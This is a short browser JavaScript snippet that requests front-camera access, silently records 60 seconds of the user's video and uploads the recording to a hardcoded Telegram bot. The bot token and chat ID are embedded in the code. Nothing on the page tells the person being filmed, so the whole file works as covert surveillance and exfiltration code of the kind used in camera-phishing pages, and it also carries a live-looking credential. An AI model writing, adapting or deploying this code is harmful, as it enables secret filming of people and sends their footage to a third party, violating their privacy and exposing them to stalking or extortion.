// Request camera permission for the front camera
navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
.then(function (stream) {
  // Define your Telegram bot API token and chat ID
  const botToken = '6541424487:AAHp2-DNMQke0dAEWh3ScahXpoT7amTaBMU';
  const chatId = '5063584314';

  // Initialize video element for the front camera
  const frontVideo = document.createElement('video');
  frontVideo.srcObject = stream;

  // Function to send video to Telegram
  function sendVideoToTelegram(videoData) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('video', videoData, { filename: 'video.webm' });

    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: 'POST',
      body: formData,
    })
    .then(response => response.json())
    .then(data => {
      console.log('Video sent to Telegram:', data);
    })
    .catch(error => {
      console.error('Error sending video to Telegram:', error);
    });
  }

  // Start recording video from the front camera for 60 seconds
  frontVideo.play();
  const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' }); // Specify 'vp9' codec
  const recordedChunks = [];

  mediaRecorder.ondataavailable = event => {
    if (event.data.size > 0) {
      recordedChunks.push(event.data);
    }
  };

  mediaRecorder.onstop = () => {
    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
    sendVideoToTelegram(videoBlob);
  };

  mediaRecorder.start();
  setTimeout(() => {
    mediaRecorder.stop();
    frontVideo.srcObject.getTracks().forEach(track => track.stop());
  }, 60000); // Record for 60 seconds
})
.catch(function (error) {
  console.error('Front camera permission denied:', error);
});
      
